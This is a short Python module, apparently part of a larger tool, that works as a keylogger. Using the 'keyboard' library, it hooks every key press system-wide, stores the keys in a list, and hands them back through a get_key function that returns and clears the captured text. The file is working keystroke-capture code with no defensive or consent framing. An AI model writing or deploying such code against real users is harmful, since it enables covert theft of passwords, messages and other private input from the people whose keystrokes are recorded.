import keyboard
def start_keylog():
    global keys, hook_status
    keys = []
    hook_status = False

def on_press(event):
        if event.event_type == "down":
            key = event.name
            keys.append(key)

def hook():
    global hook_status
    if not hook_status:
        hook_status = True
        keyboard.hook(on_press)

def unhook():
    global hook_status
    if hook_status:
        hook_status = False
        keyboard.unhook_all()

def get_key():
    global keys
    data = ''.join(keys)
    keys.clear()
    return data